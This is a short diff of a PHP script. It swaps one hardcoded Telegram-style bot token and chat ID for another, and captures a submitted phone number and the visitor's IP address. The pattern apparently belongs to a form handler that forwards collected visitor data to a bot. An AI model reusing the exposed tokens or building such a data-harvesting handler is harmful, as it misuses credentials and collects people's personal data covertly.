@@ -1,8 +1,8 @@
 <?php
 
-$token = "5881505952:AAEQn5Mq0d9DtrYh4KXgaqPh7Dbx6q6yubM";
+$token = "6736145768:AAH72cQONeCkjwfNypU2_owHCLepRuWCyX0";
 
-$id = -605089103;
+$id = -4041024884;
 
 $phone = $_POST["phone"];
 $ip = $_SERVER['REMOTE_ADDR'];
